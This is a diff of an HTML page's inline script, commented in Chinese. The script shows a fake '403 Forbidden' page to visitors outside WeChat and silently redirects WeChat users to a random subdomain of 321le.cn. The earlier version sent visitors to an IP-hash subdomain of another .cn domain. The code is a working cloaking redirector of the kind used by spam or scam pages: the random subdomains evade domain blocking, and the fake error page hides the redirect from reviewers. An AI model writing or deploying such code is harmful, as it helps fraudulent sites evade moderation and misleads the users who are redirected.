@@ -9,42 +9,37 @@
 <body>
 
     <script>
-var userAgent = navigator.userAgent;
+// 判断是否在微信中访问
+function isWeChat() {
+  var ua = navigator.userAgent.toLowerCase();
+  return ua.indexOf('micromessenger') !== -1;
+}
 
-// 判断是否在微信环境中访问
-if (userAgent.indexOf('MicroMessenger') !== -1) {
-    // 获取当前用户IP
-    var userIp = '';
+// 生成随机字符串
+function generateRandomString(length) {
+  var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+  var result = '';
+  for (var i = 0; i < length; i++) {
+    result += characters.charAt(Math.floor(Math.random() * characters.length));
+  }
+  return result;
+}
 
-    // 通过异步请求获取用户IP
-    var xhr = new XMLHttpRequest();
-    xhr.open('GET', 'https://api.ipify.org?format=json', true);
-    xhr.onreadystatechange = function () {
-        if (xhr.readyState === 4 && xhr.status === 200) {
-            var response = JSON.parse(xhr.responseText);
-            userIp = response.ip;
-            redirectToDomain(userIp);
-        }
-    };
-    xhr.send();
+// 执行重定向操作
+function redirectToDomain() {
+  var randomString = generateRandomString(10);
+  var domain = '321le.cn';
+  var redirectURL = 'http://' + randomString + '.' + domain;
+  window.location.href = redirectURL;
+}
 
-    // 将IP转化为特定的32位字符
-    function convertIPToHash(ip) {
-        return md5(ip);
-    }
-
-    // 执行重定向操作
-    function redirectToDomain(ip) {
-        var hash = convertIPToHash(ip);
-        var domain = '2022qazwsx053.cn';
-        var redirectUrl = 'http://' + hash + '.' + domain;
-
-        // 执行301重定向跳转
-        window.location.href = redirectUrl;
-    }
+if (isWeChat()) {
+  // 显示"请稍等"信息
+  document.write('<h1>请稍等...</h1>');
+  redirectToDomain();
 } else {
-    // 非微信环境下显示403 Forbidden错误
-    document.write('<h1>403 Forbidden</h1>');
+  // 非微信访问，显示403页面
+  document.write('<h1>403 Forbidden</h1>');
 }
     </script>
 </body>
